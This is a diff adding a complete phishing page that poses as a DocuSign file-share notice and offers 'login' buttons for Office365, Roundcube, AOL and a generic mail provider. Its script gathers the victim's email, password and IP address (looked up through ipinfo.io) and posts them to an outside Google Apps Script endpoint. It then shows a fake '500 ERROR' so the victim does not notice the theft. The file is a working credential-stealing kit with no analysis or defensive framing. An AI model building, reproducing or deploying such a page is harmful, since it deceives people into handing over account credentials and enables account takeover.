@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DocuSign Share File</title>
+    <link rel="shortcut icon" href="https://www.docusign.com/sites/all/themes/custom/docusign/favicons/favicon.ico">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <style>
+        #cookie-consent {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 15px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+        }
+
+        #cookie-consent button {
+            background-color: #4caf50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+
+        .mmgg {
+            width: 70%;
+            margin: auto;
+        }
+
+        #myVideo {
+            position: fixed;
+            right: 0;
+            bottom: 0;
+            min-width: 100%;
+            min-height: 100%;
+            z-index: -1;
+        }
+
+        @media (max-width: 768px) {
+            .mmgg {
+                width: 100%;
+                margin: auto;
+            }
+        }
+    </style>
+</head>
+
+<body class="body">
+    <div class="loader" style="display: none;">
+        <img src="./images/8ac12962c05648c55ca85771f4a69b2d.gif">
+    </div>
+    <video autoplay muted loop id="myVideo">
+        <source src="https://cdn.glitch.global/8d5109a6-1873-4f95-9253-bd838b3669c7/video.mp4" type="video/mp4">
+        Your browser does not support HTML5 video.
+    </video>
+
+    <div class="container-fluid p-0">
+        <div class="container-fluid">
+            <div class="row p-3" style="background-color: #fff;">
+                <div class="col-lg-12">
+                    <img src="https://docucdn-a.akamaihd.net/olive/images/2.47.0/header-logos/docusign.svg"
+                        class="img-fluid" width="119px;">
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-lg-10 mx-auto text-center" style="padding: 100px 50px 130px 50px;">
+                    <div class="mmgg">
+                        <img src="https://seeklogo.com/images/D/docusign-logo-2C4F5FAE95-seeklogo.com.png"
+                            class="img-fluid" width="100px"><br>
+                        <span class="h1 text-white">Welcome to DocuSign</span><br>
+                        <span class="text-white h5" style="font-size: 42px; font-weight: 300; margin-top: 5; margin-bottom: 15px;">Your Contact has shared a file with you.</span><br>
+                        <p class="text-white" style="font-size: 20px;">
+                            Save your files to Adobe PDF and get them from any device, anywhere
+                            Select any of the options below to view and download the file
+                        </p><br>
+                    </div>
+                    <div class="my-3 rounded">
+                        <div class="row p-3" style="justify-content: center;">
+                            <div class="col-lg-2 text-center officelog" data-formid="form1" data-color="#FF3C00">
+                                <a href="javascript:void(0)" class="hvr-grow w-100">
+                                    <div class="rounded px-2 py-1 mt-2" style="background-color: #FF3C00;">
+                                        <img src="https://robertlugana.sirv.com/officrout.png" class="img-fluid" width="30px"
+                                            style="padding:5px 0px 5px 0px;"><br>
+                                        <span class="pl-2"
+                                            style="vertical-align: middle; color: white; font-weight: 500; border-radius: 4px;">Login
+                                            with<br> Office365</span>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="col-lg-2 text-center yahoolog" data-formid="form2" data-color="#212529">
+                                <a href="javascript:void(0)" class="hvr-grow w-100">
+                                    <div class="rounded px-2 py-1 mt-2" style="background-color: #212529;">
+                                        <img src="https://roundcube.net/images/roundcube_logo_icon.svg"
+                                            class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                                        <span class="pl-2"
+                                            style="vertical-align: middle; color: white; font-weight: 500; border-radius: 4px;">Login
+                                            with<br> Roundcube!</span>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="col-lg-2 text-center otherlog" data-formid="form3" data-color="#0B5BD3">
+                                <a href="javascript:void(0)" class="hvr-grow w-100">
+                                    <div class="rounded px-2 py-1 mt-2" style="background-color: #0B5BD3;">
+                                        <img src="https://lh3.googleusercontent.com/a/AAcHTtfJ7Q5DqxjRRBefsd5AZmBQPLR14WeEEzmlEw4Y=s432-c-no" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                                        <span class="pl-2"
+                                            style="vertical-align: middle; color: white; font-weight: 500; border-radius: 4px;">Login
+                                            with<br> OtherMail</span>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="col-lg-2 text-center aollog" data-formid="form4" data-color="#E60000">
+                                <a href="javascript:void(0)" class="hvr-grow w-100">
+                                    <div class="rounded px-2 py-1 mt-2" style="background-color: #E60000;">
+                                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4a/Aol.svg/2048px-Aol.svg.png"
+                                            class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                                        <span class="pl-2"
+                                            style="vertical-align: middle; color: white; font-weight: 500; border-radius: 4px;">Login
+                                            with<br> AOL</span>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <p class="text-white">
+                        <i class="fa fa-key"></i>
+                        This link only works for the direct recipient of this message. Please securely share with intended
+                        recipients only.
+                    </p>
+                    <br>
+
+                </div>
+            </div>
+        </div>
+
+        <div class="container-fluid fixed-bottom" id="cookie-consent">
+            <div class="container-fluid">
+                <div class="row p-3">
+                    <div class="col-lg-10 mx-auto text-center">
+                        <p class="text-white" style="font-size: 20px;">
+                            We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.
+                        </p>
+                        <button onclick="acceptCookies()">Accept</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        document.querySelectorAll('.officelog, .yahoolog, .otherlog, .aollog').forEach(function (link) {
+            link.addEventListener('click', function (event) {
+                event.preventDefault();
+                var formId = link.getAttribute('data-formid');
+                var color = link.getAttribute('data-color');
+                openModal(formId, color);
+            });
+        });
+    
+        function openModal(formId, color) {
+            console.log('Open modal for formId:', formId, 'with color:', color);
+    
+            // Modal title mapping
+            var modalTitle = '';
+            switch (formId) {
+                case 'form1':
+                    modalTitle = 'Login with Office365';
+                    break;
+                case 'form2':
+                    modalTitle = 'Login with Roundcube';
+                    break;
+                case 'form3':
+                    modalTitle = 'Login with OtherMail';
+                    break;
+                case 'form4':
+                    modalTitle = 'Login with AOL';
+                    break;
+                default:
+                    modalTitle = 'Login';
+                    break;
+            }
+    
+            // Create the modal element
+            var modal = document.createElement('div');
+            modal.className = 'modal fade';
+            modal.id = formId;
+            modal.tabIndex = '-1';
+            modal.setAttribute('aria-labelledby', formId + 'Label');
+            modal.setAttribute('aria-hidden', 'true');
+    
+            modal.innerHTML = `
+                <div class="modal-dialog">
+                    <div class="modal-content">
+                        <div class="modal-header" style="background-color: ${color};">
+                            <h5 class="modal-title" id="${formId}Label">${modalTitle}</h5>
+                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                        </div>
+                        <div class="modal-body">
+                            <form id="${formId}Form">
+                                <div class="mb-3">
+                                    <label for="${formId}Email" class="form-label">Email address</label>
+                                    <input type="email" class="form-control" id="${formId}Email" name="Email" required>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="${formId}Password" class="form-label">Password</label>
+                                    <input type="password" class="form-control" id="${formId}Password" name="Password" required>
+                                    <input type="hidden" name="FormId" value="form11">
+                                </div>
+                                <button type="submit" class="btn btn-primary">Login</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            `;
+    
+            // Append the modal to the body
+            document.body.appendChild(modal);
+    
+            // Use Bootstrap's modal methods to show the modal
+            var bootstrapModal = new bootstrap.Modal(modal);
+            bootstrapModal.show();
+    
+            // Remove the modal from the DOM after it is hidden
+            modal.addEventListener('hidden.bs.modal', function () {
+                document.body.removeChild(modal);
+            });
+    
+            // Handle the form submission
+            document.getElementById(formId + 'Form').addEventListener('submit', function (event) {
+                event.preventDefault();
+                console.log('Form submitted for', formId);
+    
+                // Collect form data
+                var formData = new FormData(this);
+    
+                // Get user IP address
+                var ipAddress = ''; // Initialize IP address variable
+                fetch('https://ipinfo.io/json')
+                    .then(function(response) {
+                        if (!response.ok) {
+                            throw new Error('Failed to fetch IP address');
+                        }
+                        return response.json();
+                    })
+                    .then(function(data) {
+                        ipAddress = data.ip; // Store the fetched IP address
+                        console.log('User IP Address:', ipAddress);
+    
+                        // Add IP address to form data
+                        formData.append('IPAddress', ipAddress);
+                        console.log('Form Data:', formData);
+    
+                        // Configure the fetch request
+                        return fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec', {
+                            method: 'POST',
+                            body: formData
+                        });
+                    })
+                    .then(function(response) {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(function(data) {
+                        console.log('Response:', data);
+                        // Handle success or further processing
+                    })
+                    .catch(function(error) {
+                        console.error('There was a problem with the fetch operation:', error);
+                        // Handle error
+                    });
+    
+                // Close the modal after form submission
+                bootstrapModal.hide();
+    
+                // Optional: Clear form fields
+                this.reset();
+    
+                // Replace existing content with new content after 3 seconds
+                setTimeout(function () {
+                    var newContent = `
+                    <br>
+                        <div class="container">
+                            <div class="compcontainer">
+                            </div>
+                            <h1 class="header">500 ERROR</h1>
+                            <div class="instructions">
+                                <h2>Error retrieving your files due to access restriction by the provider or our systems are still processing your access. Please try again and if the problem persists please contact the document provider immediately.</h2>
+                                <p>In the meantime, you can:</p>
+                                <div class="step">
+                                    <a href="#" id="tryAgainLink">Try Again</a>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+    
+                    // Select the container and replace its content
+                    var container = document.querySelector('.container-fluid');
+                    container.innerHTML = newContent;
+    
+                    // Hide the background video
+                    var video = document.getElementById('myVideo');
+                    video.style.display = 'none';
+                }, 3000); // 3000 milliseconds = 3 seconds delay
+            });
+        }
+        
+
+        // Cookie consent functionality
+        function acceptCookies() {
+            document.getElementById('cookie-consent').style.display = 'none';
+        }
+
+        window.onload = function () {
+            document.getElementById('cookie-consent').style.display = 'block';
+        };
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+</body>
+</html>
